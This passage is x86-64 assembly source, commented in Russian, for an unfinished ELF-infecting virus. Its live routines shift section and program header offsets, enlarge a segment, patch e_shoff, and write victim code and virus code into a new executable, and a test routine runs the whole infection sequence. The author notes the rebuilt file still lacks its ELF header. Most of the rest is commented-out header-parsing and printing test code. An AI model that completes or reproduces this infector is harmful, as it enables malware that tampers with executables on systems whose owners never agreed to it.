    mov   (%rbx), %rsi

    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    //  увеличить поля sh_offset и sh_addr всех заголовков, находящихся
    //  после точки заражения - vaddr end заражаемого сегмента - на размер кода вируса
    call   shdr_offset_and_addr_recount
    leaq   infected_seg_addr(%rip), %rbx

    // посчитать размер кода от начала эльфа до точки заражения
    leaq  infected_seg_addr(%rip), %rbx
    mov   (%rbx), %rdi

    PHDR_P_OFFSET  %rdi, %rax

    leaq  infected_seg_size(%rip), %rbx
    mov   (%rbx), %rcx

    add   %rcx, %rax
    leaq  victim_code_before_infect_point_size(%rip), %rbx
    mov   %rax, (%rbx)                                      # save size

    // params for phdr_offset_and_addr_recount
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rdx

    leaq  victim_phdr_amount(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_phdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    // изменить поля p_offset, p_vaddr, p_paddr во всех заголовках,
    // которые описывают на сегменты, находящиеся НИЖЕ точки заражения
    call    phdr_offset_and_addr_recount

    // params for add_size_to_phdr
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  infected_seg_addr(%rip), %rbx
    mov   (%rbx), %rdi

    // увеличить поля p_filesz и p_memsz на размер вируса - т.е. расширить сегмент
    call  add_size_to_phdr

    //  посчитать размер кода от точки заражения до конца эльфа
    leaq  victim_shdr_table_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  victim_shdr_table_size(%rip), %rbx
    mov   (%rbx), %rsi
    add    %rdi, %rsi        # указатель, на котором заканчивается таблица заг. секц

    leaq  infected_seg_addr(%rip), %rbx
    mov   (%rbx), %rdi

    leaq  infected_seg_size(%rip), %rbx
    mov   (%rbx), %rcx
    add    %rcx, %rdi

    sub  %rdi, %rsi         # размер кода от точки заражения до конца файла


    leaq  victim_code_after_infect_point_addr(%rip), %rbx
    mov   %rdi, (%rbx)                                      # save addr

    add    %rcx, %rsi
    leaq  victim_code_after_infect_point_size(%rip), %rbx
    mov   %rsi, (%rbx)                                      # save size

    // увелчиивает поле e_shof в заголовке эльфа - смещение до табл. загл. секций
    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_elf_addr(%rip), %rbx
    mov   (%rbx), %rdi

    add   $0x28, %rdi   # смещение до e_shoff
    add   %rsi, (%rdi)  #

    pop  %rsi
    pop  %rdi
    pop  %rcx
    pop  %rdx
    pop  %rbx
    pop  %rax

    ret

    // RECOMBINE_ELF
    // Вписывает вирус и код жертвы в заданный файл
    // PARAMS
    // RDI - test infecion file name
recombine_elf:

    mov     $O_RDWR_AND_O_APPEND,  %rsi
    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    leaq    fd(%rip), %rbx
    mov     %rax, (%rbx)   # save fd


    // заисать файл жертвы от начала до точки заражения:
    // заголовок эльфа, заголовки программ и весь код до конца зараж. сегм. кода
    leaq     victim_code_before_infect_point_size(%rip), %rbx
    mov     (%rbx), %rdx

    leaq    victim_elf_addr(%rip), %rbx
    mov     (%rbx), %rsi

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    # в rcx можно указать смещение, откуда начать запись
    # но если файл открыт на o_append, этот аргумент игнорируется
    mov     $0x12, %rax   # syscall pwrite
    syscall


    // записать в файл код вируса
    leaq  virus_code_addr(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  virus_code_size(%rip), %rbx
    mov   (%rbx), %rdx

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    // записать в файл код жертвы от точки заражения до конца:
    // код + заголовки секций
    leaq  victim_code_after_infect_point_addr(%rip), %rbx
    mov   (%rbx), %rsi

    leaq  victim_code_after_infect_point_size(%rip), %rbx
    mov   (%rbx), %rdx

    leaq    fd(%rip), %rbx
    mov     (%rbx), %rdi      # fd

    mov     $0x12, %rax      # syscall pwrite
    syscall

    ret

    // -----------------------------------
    // TODO: Здесь надо продолжать... <= |
    // -----------------------------------
    // DEBUG: эльф собирается неверно, отсутствует заголовок эльфа - скорее всего
    // поврежден указатель на начало эльфа (скорее всего ошибка по невнимательности)

    // Тестовое заражения файла. Цель заразить файл вирусом без передачи ему
    // управления
_test_file_infection:

    // CHECK_CANARY

    // lea     _file_name3(%rip), %rdi
    // mov     $O_RDWR, %rsi
    // call    _openfile

    lea     _file_name3(%rip), %rdi
    call    _get_victim_data            # получить данные жертвы
    // call    _print_victim_data_fn

    call    _get_virus_code             # получить данные вируса
    // call    _print_virus_data_fn

    call    _find_poin_for_infection    # найти точку для заражения
    // call    _print_infection_data_fn

    call    recount                     # отредактировать поля заголовков
    lea     new_elf_file(%rip), %rdi
    call    recombine_elf               # записать код вируса и жертвы в новый эльф

test_file_infection_end:
    ret

// _test_file_infection_error:
//     mov     $1, %rax            # write
//     mov     $1, %rdi            # to stdout
//     lea     _errmsg_openfile_tfi(rip), %rsi
//     mov     $len_errmsg_openfile_tfi, %rdx
//     syscall
// _errmsg_openfile_tfi:
//     .string "err: openfile in _test_file_infection\n"
//     .set len_errmsg_openfile_tfi, . - _errmsg_openfile_tfi
//     jmp _exit

//     # побайтово проверяет содержимое по заданному указателю, пока не найдет
//     # сигнатуру. Если нашел - возвращает адрес, по которому она расположена, в
//     # противном случае возвращает 0
//     # в rdi принимает указатель на код, в котором следует искать сигнатуру
//     # в rsi - размер этого кода в байтах
// find_virus_signature:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     push    %rdx
//     push    %rbx

//     mov     %rsi, %rcx

// create_example:
//     sub     $0x18, %rsp
//     lea     -0x8(%rbp),  %rdx

//     movb     $0x4, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x14, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x3, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     movb     $0x47, (%rdx)
//     inc      %rdx

//     movb     $0x4e, (%rdx)
//     inc      %rdx

//     movb     $0x55, (%rdx)
//     inc      %rdx

//     movb     $0x0, (%rdx)
//     inc      %rdx

//     lea     -0x8(%rbp),  %rsi  # загрузили адрес начала примера в rsi
//     mov      $0x0, %rdx        # установили счетчик совпадения

// find_virus_signature_cycle:

//     movzwl   (%rsi), %eax
//     movzwl  %ax, %eax

//     movzwl   (%rdi), %ebx
//     movzwl  %bx, %ebx

//     cmp     %al, %bl
//     jne     mismatch_example

//     inc     %rdx

//     inc     %rdi
//     inc     %rsi

//     cmp     $0x10, %rdx
//     je      find_virus_signature_success

//     jmp     find_virus_signature_continue_cycle

// mismatch_example:
//     lea     -0x8(%rbp),  %rsi  # загрузили адрес начала примера в rsi
//     mov      $0x0, %rdx        # установили счетчик совпадения

//     inc     %rdi

// find_virus_signature_continue_cycle:
//     loop    find_virus_signature_cycle

// find_virus_signature_fail:
//     mov     $0x0, %rax

//     jmp     find_virus_signature_end

// find_virus_signature_success:
//     sub     $0x10, %rdi
//     mov     %rdi, %rax

// find_virus_signature_end:
//     add     $0x18, %rsp

//     pop     %rbx
//     pop     %rdx
//     pop     %rcx

//     pop     %rbp
//     ret

// test_find_virus_signature:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $virus_file_name, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     mov     %rax, %rdi
//     mov     $0x4c70, %rsi

//     call    find_virus_signature

//     mov     %rax, %rsi
//     mov     $0x0, %rdi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8
//     call	my_printf

//     pop     %rbp
//     ret

/* READ_ELF_HEADER
    # читает заголовок эльфа из памяти

    * @PARAMS
    * %RDI - dest
    * %RSI - src - укаатель на память, где лежит эльф файл

    */

//     .globl  _read_elf_header
// 	.type	_read_elf_header, @function

// _read_elf_header:
//     push    %rbx
//     push    %rcx

//     mov     $0x1, %rdx
//     mov     $0x40, %rcx  # elfhdr sz

//     call    my_fread

//     pop     %rdx
//     pop     %rcx

//     ret

    // TEST READ_ELF_HEADER

    // цель теста: открыть заданный эльф, смаппить его в память,
    // прочитать из памяти его заголовок и вывести его в stdout

// test_elf_hdr_buf:
//     .space 64, 0

// test_elf_file:
//     .string "ex"

// test_elf_file_err_msg:
//     .string "ERR: read elf header \n"
//     .set len_test_elf_file_err_msg, . - test_elf_file_err_msg

// test_read_elf_header:
//     lea     test_elf_file(%rip), %rdi
//     mov 	$O_RDONLY,  %rsi
//     // O_RDWR %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_elf_header_exit

//     mov     %rax, %rsi                    # src ptr

//     lea     test_elf_hdr_buf(%rip), %rdi  # dest ptr
//     call    read_elf_header

//     lea     test_elf_hdr_buf(%rip), %rdi
//     call    print_elf_header

//     jmp     test_read_elf_header_exit

// test_read_elf_header_error:
//     lea     test_elf_file_err_msg(%rip), %rsi
// 	mov     len_test_elf_file_err_msg, %rdx
// 	call    _my_write

// test_read_elf_header_exit:
//     ret

//     # читает заголовок пргграммы из памяти
//     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
//     # таблицы заголовков программы, в rdi - указатель на место под записья
// program_header:
//     .space 0x38,0

//     .globl  read_program_header
// 	.type	read_program_header, @function

// read_program_header:
//     push %rbx
//     push %rdx

//     mov  $0x1, %rdx
//     mov  $0x38, %rbx

//     call fread

//     pop  %rdx
//     pop  %rbx

//     ret

//     # принимает в edi указатель на структуру заголовка программы и выводит его поля

//     .globl  print_program_header
// 	.type	print_program_header, @function

// print_program_header:

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     mov     %rdi, %rcx

// 	movl	(%rcx), %esi
//     mov     $p_type_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xE, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $p_flags_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_offset_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_vaddr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_paddr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_filesz_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_memsz_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $p_align_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     ret

// test_read_program_header:

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY, %rsi
//     call    _openfile

//     cmp     $0, %rax

//     jle     test_read_program_header_end

//     mov     %rax, %rdi
//     mov     %rdi,  %rsi

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi
//     mov     $program_header, %rdi
//     call    read_program_header

//     mov     $program_header, %rdi
//     call    print_program_header

// test_read_program_header_end:
//     ret

//     # читает все заголовки програм
//     # принимает в rdi адрес, по которому должны быть записаны заголовки
//     # в rsi - адрес, по которому лежат заголвки в памяти
//     # в rdx - количество заголовков
//     .globl  read_all_program_headers
// 	.type	read_all_program_headers, @function

// read_all_program_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     mov     %rdx, %rcx
// read_all_program_headers_cycle:

//     call    read_program_header

//     loop    read_all_program_headers_cycle
//     pop     %rcx

//     pop     %rbp
//     ret

//     # принимает в rdi aдрес, по которому лежат заголовки
//     # в rsi - их количество

//     .globl  print_all_program_headers
// 	.type	print_all_program_headers, @function

// print_all_program_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     push    %r8
//     push    %rdx
//     push    %rax

//     mov     %rsi, %rcx

// print_all_program_headers_cycle:

//     mov     %rdi, %rax

//     call    print_program_header

//     mov     $next_str, %rdi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     add     $0x38, %rdi

//     loop    print_all_program_headers_cycle

//     pop     %rax
//     pop     %rdx
//     pop     %r8
//     pop     %rcx

//     pop     %rbp
//     ret

// test_read_all_program_headers:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_all_program_headers_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x38, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_program_headers
//     add     %rax,  %rsp

// test_read_all_program_headers_end:
//     pop %rbp
//     ret

// SHDR_OFFSET_AND_ADDR_RECOUNT
//     # пересчитывает смещения и адреса секций, которые будут находиться после
//     #  вставленного в жертву вируса
//     # т.е. если вирус вставляется после тысячного байта в эльф-жертву, то все,
//     # что находится после него, должно быть смещено на размер кода вируса.
//     # поэтому мы будем пересчитывать адреса и смещения для всех секций, которые
//     # находятся после той точки, кда вставлялся вирус и менять заголовки секций
//     # ( менять заголовки программ не придется, поскольку вирус вставляется после
//     #   последнего сегмента кода )
//
//     PARAMS
//     # принимает в rdi  указатель на заголовки,
//     # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
//     # в rcx - сколько байт занимает вирус

    .globl  shdr_offset_and_addr_recount
    .type	shdr_offset_and_addr_recount, @function

// recount_msg:
//     .string "after recount: \n"

shdr_offset_and_addr_recount:

    push  %r8

    mov   %rcx, %r8
    mov   %rsi, %rcx        # установили счетчик цикла

shdr_offset_and_addr_recount_cycle:

    add   $0x18, %rdi

    cmp   %rdx,  (%rdi)

    jl    next_iter_recount

    add   %r8, (%rdi)   # пересчитываем адрес и смещение

    sub   $8, %rdi

    cmp   $0, (%rdi)
    jle   mov_addr_to_offset_field

    add   %r8, (%rdi)

mov_addr_to_offset_field:

    add   $8, %rdi

next_iter_recount:
    add   $0x28, %rdi

    loop shdr_offset_and_addr_recount_cycle
    pop  %r8

    ret

// test_shdr_offset_and_addr_recount:

//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_shdr_offset_and_addr_recount_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     ELF_E_SHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_section_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_section_headers

//     mov     %rcx, %r9

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi
//     mov     $0xe10, %rdx
//     mov     $0x3e8, %rcx

//     call    shdr_offset_and_addr_recount

//     mov     $recount_msg,%rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     lea     (%rsp), %rdi
//     mov     %r9, %rsi
//     call    print_all_section_headers

//     add     %rax,  %rsp

// test_shdr_offset_and_addr_recount_end:
//     pop %rbp

//     ret


// PHDR_OFFSET_AND_ADDR_RECOUNT
//    PARAMS
//     # принимает в rdi  указатель на заголовки,
//     # в rsi - их количество, в rdx - адрес, по которому будет записан вирус,
//     # в rcx - сколько байт занимает вирус

 // увеличивают поля p_offset, p_vaddr и p_paddr на размер вируса  во всех заголовках,
 // которые описывают код, находящийся НИЖЕ точки инфицирования
phdr_offset_and_addr_recount:

    push  %r8

    mov   %rcx, %r8
    mov   %rsi, %rcx        # установили счетчик цикла

phdr_offset_and_addr_recount_cycle:

    add   $0x10, %rdi    # проверяем адрес

    cmp   %rdx,  (%rdi)  # если сегмент находится до точки записи вируса
    jl    next_iter_recount_phdr  #  пропускаем заголовок

    add   %r8, (%rdi)   # иначе пересчитываем vaddr и paddr
    add   $0x8, %rdi
    add   %r8, (%rdi)

    sub   $0x10, %rdi  # сдвигаем указатель на смещение

add_offset_phdr2:
    cmp   $0x0, (%rdi)  # сли ноль, то не редактируем
    jle   mov_addr_to_offset_field_phdr

    add   %r8, (%rdi)

mov_addr_to_offset_field_phdr:

    add   $0x8, %rdi

next_iter_recount_phdr:
    add   $0x28, %rdi
    loop phdr_offset_and_addr_recount_cycle

    pop  %r8

    ret

// test_phdr_offset_and_addr_recount:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_phdr_offset_and_addr_recount_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     ELF_E_PHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_program_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_program_headers

//     mov     %rcx, %r9

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi
//     mov     $0x400040, %rdx
//     mov     $0x10, %rcx

//     call    phdr_offset_and_addr_recount

//     mov     $recount_msg,%rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     lea     (%rsp), %rdi
//     mov     %r9, %rsi
//     call    print_all_program_headers

//     add     %rax,  %rsp

// test_phdr_offset_and_addr_recount_end:
//     pop  %rbp

//     ret


//     # читает заголовок секции из памяти
//     # в rsi принимает указатель на память, в которой лежит эльф, смещенный до начала
//     # таблицы заголовков секций, в rdi - указательн на память, куда будет записан
//     # заголовок
// section_header:
//     .space 0x40, 0

//     .globl  read_section_header
// 	.type	read_section_header, @function

// read_section_header:
//     push %rbx
//     push %rdx

//     mov  $0x1, %rdx
//     mov  $0x40, %rbx

//     call fread

//     pop  %rdx
//     pop  %rbx

//     ret
//     # принимает в rdi указатель на структуру заголовка секции
//     # печатает все поля секции
// print_section_header:

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     mov     %rdi, %rcx

// 	movl	(%rcx), %esi
//     mov     $sh_name_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $sh_type_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl	(%rcx), %esi
//     mov     $sh_flags_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_addr_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_offset_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x11, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_size_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_link_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     mov 	(%rcx), %rsi
//     mov     $sh_info_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0xF, %r8
//     call	my_printf

//     add     $0x4, %rcx

//     movl 	(%rcx), %esi
//     mov     $sh_addralign_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call	my_printf

//     add     $0x8, %rcx

//     movl 	(%rcx), %esi
//     mov     $sh_entsize_msg, %rdi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call	my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     ret
// test_read_section_header:

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax

//     jle     test_read_section_header_end

//     mov     %rax, %rdi
//     mov     %rdi,  %rsi

//     ELF_E_SHOFF %rdi, %rcx
//     add     %rcx, %rsi
//     mov     $section_header, %rdi
//     call    read_section_header

//     mov     $section_header, %rdi
//     call    print_section_header
// test_read_section_header_end:
//     ret

//     # читает все заголовки секций
//     # принимает в rdi адрес, по которому должны быть записаны заголовки
//     # в rsi - адрес, по которому лежат заголвки в памяти
//     # в rdx - количество заголовков
//     .globl  read_all_section_headers
// 	.type	read_all_section_headers, @function

// read_all_section_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     mov     %rdx, %rcx
// read_all_section_headers_cycle:

//     call    read_section_header

//     loop    read_all_section_headers_cycle
//     pop     %rcx

//     pop     %rbp
//     ret

//     # принимает в rdi aдрес, по которому лежат заголовки
//     # в rsi - их количество

//     .globl  print_all_section_headers
// 	.type	print_all_section_headers, @function

// print_all_section_headers:

//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rcx
//     push    %r8
//     push    %rdx
//     push    %rax

//     mov     %rsi, %rcx

// print_all_section_headers_cycle:

//     mov     %rdi, %rax

//     call    print_section_header

//     mov     $next_str, %rdi
//     mov     $0x0, %rdx
//     mov     $0x1, %r8

//     call    my_printf

//     mov     %rax, %rdi
//     add     $0x40, %rdi

//     loop    print_all_section_headers_cycle

//     pop     %rax
//     pop     %rdx
//     pop     %r8
//     pop     %rcx

//     pop     %rbp
//     ret

// test_read_all_section_headers:
//     push    %rbp
//     mov     %rsp, %rbp

//     mov     $file_name3, %rdi
//     mov 	$O_RDONLY,  %rsi
//     call    _openfile

//     cmp     $0, %rax
//     jle     test_read_all_section_headers_end

//     mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
//     mov     %rax, %rsi

//     ELF_E_SHOFF %rdi, %rcx
//     add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

//     ELF_E_SHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
//     movl    (%rax), %ecx
//     movzwl  %cx, %ecx

//     mov     %rcx, %rdx

//     mov     $0x40, %rax
//     imul     %rcx,  %rax

//     add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
//     sub     %rax,  %rsp

//     lea     (%rsp),  %rdi

//     call    read_all_section_headers

//     lea     (%rsp),  %rdi
//     mov     %rcx, %rsi

//     call    print_all_section_headers
//     add     %rax,  %rsp

// test_read_all_section_headers_end:
//     pop %rbp
//     ret

    // # принимает указатель на структуру заголовка эльфа и выводит все его поля
    // .globl  print_elf_header
	// .type	print_elf_header, @function

//     # принимает в rdi указатель на структуру эльф-хедера
// print_elf_header:
//     push    %rbp
//     mov     %rsp, %rbp

//     push    %rsi
//     push    %rdx
//     push    %rcx
//     push    %r8

//     add     $0x10, %rdi
//     mov     %rdi, %rcx

//     mov     $e_type_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx,  %edx
//     mov     %edx,  %esi
//     mov     $0x10, %rdx
//     mov     $0xf, %r8
//     call    my_printf

//     add     $0x2, %rcx

//     mov     $e_machine_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx,  %edx
//     mov     %edx,  %esi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call    my_printf

//     add     $0x2, %rcx

//     mov     $e_version_msg, %rdi
//     movzwl  (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x12, %r8
//     call    my_printf

//     add     $0x4, %rcx

//     mov     $e_entry_msg, %rdi
//     movzwl  (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_phoff_msg, %rdi
//     mov     (%rcx), %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_shoff_msg, %rdi
//     mov     (%rcx), %rsi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $0x8, %rcx

//     mov     $e_ehsize_msg, %rdi
//     movl    (%rcx), %esi
//     mov     $0x10, %rdx
//     mov     $0x11, %r8
//     call    my_printf

//     add     $4, %rcx

//     mov     $e_flags_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0xf, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_phentsize_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_phnum_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shentsize_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x14, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shnum_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x10, %r8
//     call    my_printf

//     add     $2, %rcx

//     mov     $e_shstrndx_msg, %rdi
//     movzwl  (%rcx), %edx
//     movzwl  %dx, %esi
//     mov     $0x10, %rdx
//     mov     $0x13, %r8
//     call    my_printf

//     pop     %r8
//     pop     %rcx
//     pop     %rdx
//     pop     %rsi

//     pop     %rbp
//     ret


//     // CNVRT_NUM_TO_HEX_STRING
//     /* Побайтово конвертирует число в ascii-кода для вывода в шестнадцатеричном формате
//     @PARAMS
//     - %RSI - указатель на массив, в котором лежит число

//     Данную функцию можно использовать только после конвертации числа в
//     16-байтовый массив (см. cnvrt_addr_in_16_byte)

//     Если число в текущем байте < 9, оно будет сковертировано в аски-код цифры,
//     в противном случае число бдет сконвертировано в букву

//     Сконвертированное в аски-коды число записывается в массив converted_addr,
//     в последний байт массива вписывается символ перевода строки для удобства вывода
//     числа в будущем (возможно, перевод строки стоит убрать ?)

//     */

converted_addr:
    .space 0x11, 0

    .globl  cnvrt_num_to_hex_string
	.type	cnvrt_num_to_hex_string, @function

cnvrt_num_to_hex_string:
    push    %rax
    push    %rdi
    push    %rcx

    lea     converted_addr(%rip), %rdi   # вписали перевод строки
    add     $0x10, %rdi
    movb    $0xA,  (%rdi)

    lea     converted_addr(%rip), %rdi
    mov     $0x10, %rcx                  # loop cntr

cnvrt_num_cycle:
    // TAKE CUR. NUM
    xor     %rax, %rax
    movb    (%rsi), %al

    // NUMBER OR LETTER?
    cmp     $0x09, %rax                   # число или буква?
    jg      cnvrt_in_letter

    // NUMER
    add     $0x30,  %al                   # сконвертировать аски-код числа
    jmp     continue_cycle

    // LETTER
cnvrt_in_letter:
    add     $0x57, %al                    # сконвертировать аски-код числа

    // WRITE DOWN ASCII-CODE
continue_cycle:
    movb    %al, (%rdi)

    inc     %rsi
    inc     %rdi
    loop    cnvrt_num_cycle

cnvrt_num_end:
    popq    %rcx
    popq    %rdi
    popq    %rax

	ret

// test_cnvrt_num_to_hex_string:

//     pushq   %rbp
// 	movq    %rsp, %rbp

//     mov     $byted_addr, %rdi
//     mov     $0x10, %rsi

//     call    clear_array
//     mov     $byted_addr, %rsi

//     movb    $0x01, (%rsi)

//     call    cnvrt_num_to_hex_string

//     mov     $0x0, %rdi
//     mov     $converted_addr, %rsi
